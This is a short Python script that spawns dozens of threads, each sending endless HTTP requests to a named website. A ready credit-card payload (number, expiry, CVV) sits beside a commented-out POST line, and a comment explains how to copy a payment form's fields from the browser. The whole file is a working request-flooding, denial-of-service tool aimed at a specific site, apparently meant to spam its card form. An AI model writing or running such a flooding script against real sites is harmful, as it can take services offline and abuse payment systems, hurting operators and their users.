# try from the browser and get the URL. See the headers in Network tab in the browser to see the fields you need to complete
import requests
import threading

url = 'https://georgiosnetworks.com/'

data = {
    'cc_number': '40070000000027',
    'cc_expmonth': '08',
    'cc_expyear': '21',
    'cc_cvv': '234',
    
}


def do_request():
    while True:
        # response = requests.post(url, data=data).text
        response = requests.get(url)
        print(response)

threads = []

for i in range(500):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
